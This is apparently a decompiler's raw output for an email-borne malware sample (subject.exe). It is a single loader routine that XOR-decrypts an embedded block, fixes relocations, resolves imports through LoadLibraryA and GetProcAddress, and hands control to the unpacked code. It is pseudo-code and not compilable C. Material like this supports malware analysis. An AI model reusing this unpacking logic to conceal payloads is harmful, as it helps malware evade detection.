// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0102/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 ebx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_28 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_16 * esi_15 = null
	Eq_16 * ebx_276 = eax_28 + 0x00000016
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401030
l0040102D:
	ebx_276 = eax_28 - 0x0000000C;
l00401030:
	Eq_30 * eax_48 = null
l00401035:
	branch esi_15 != ebx_276 l0040103E
l0040103C:
	esi_15 = null;
l0040103E:
	byte v15_68 = eax_48->b401190 ^ esi_15->b404000
	eax_48->b401190 = v15_68;
	eax_48 = eax_48 + 1;
	esi_15 = esi_15 + 1;
	branch eax_48 <u (Eq_30 *) 0x00001440 l00401035
l0040105A:
	Eq_53 * ecx_115 = &globals->t402490
	up32 dwLoc08_119 = 0x00000000
l00401080:
	word32 eax_93 = ecx_115->dw0004
	Eq_82 * edx_100 = &ecx_115->t0008
	branch eax_93 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010BA
l00401092:
	uint32 esi_253 = eax_93 - 0x00000008 >>u 0x00000001
l00401094:
	word32 eax_256 = (word32) edx_100->w0000
	branch (eax_256 & 0x0000F000) != 0x00003000 l004010B2
l004010A7:
	Eq_89 * eax_268 = (eax_256 & 0x00000FFF) + ecx_115->dw0000
	eax_268->dw400F10 = eax_268->dw400F10 + 0xF0400F10;
l004010B2:
	edx_100 = edx_100 + 1;
	esi_253 = esi_253 - 0x00000001;
	branch esi_253 != 0x00000000 l00401094
l004010BA:
	word32 eax_105 = ecx_115->dw0004
	up32 edx_107 = dwLoc08_119 + eax_105
	Eq_63 * ecx_108 = ecx_115 + eax_105
	branch edx_107 <u 0x000000E4 l00401080
	word32 eax_112 = ecx_108->dw0004
	up32 edx_114 = edx_107 + eax_112
	ecx_115 = ecx_108 + eax_112;
	dwLoc08_119 = edx_114;
	branch edx_114 <u 0x000000E4 l00401080
l004010D1:
	branch globals->dw401C94 == 0x00000000 l00401154
	Eq_117 * esi_125 = &globals->t401C84
	Eq_117 * dwLoc08_126 = &globals->t401C84
	esi_155 = esi_125;
	branch globals->dw401C94 == 0x00000000 l00401154
l004010E4:
	Eq_117 * esi_155
	branch LoadLibraryA(esi_155->dw000C + 0x00400F10) == 0x00000000 l00401147
	Eq_143 eax_172 = LoadLibraryA(esi_155->dw000C + 0x00400F10)
	Eq_143 edx_174 = eax_172
	branch eax_172 == 0x00000000 l00401147
l004010FD:
	branch esi_155->dw0000 != 0x00000000 l00401106
	word32 ebx_202 = esi_155->dw0000
	branch ebx_202 != 0x00000000 l00401106
l00401103:
	ebx_202 = esi_155->dw0010;
l00401106:
	Eq_175 * ebx_208 = ebx_202 + 0x00400F10
	Eq_178 * edi_209 = esi_155->dw0010 + 0x00400F10
	branch ebx_208->dw0000 == 0x00000000 l00401147
l00401112:
	goto l00401118
l00401114:
	edx_174 = eax_172;
l00401118:
	Eq_200 dwLoc1C_231
	int32 eax_224 = ebx_208->dw0000
	word16 ax_225 = (word16) eax_224
	branch eax_224 >= 0x00000000 l00401127
l00401121:
	dwLoc1C_231 = (word32) ax_225;
	goto l0040112C
l00401127:
	dwLoc1C_231 = eax_224 + 0x00400F12;
l0040112C:
	edi_209->dw0000 = GetProcAddress(edx_174, dwLoc1C_231);
	ebx_208 = ebx_208 + 1;
	edi_209 = edi_209 + 1;
	branch ebx_208->dw0000 != 0x00000000 l00401114
l00401143:
	esi_155 = dwLoc08_126;
l00401147:
	esi_155 = esi_155 + 1;
	dwLoc08_126 = esi_155;
	branch esi_155->dw0010 != 0x00000000 l004010E4
l00401154:
	0x00401960()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

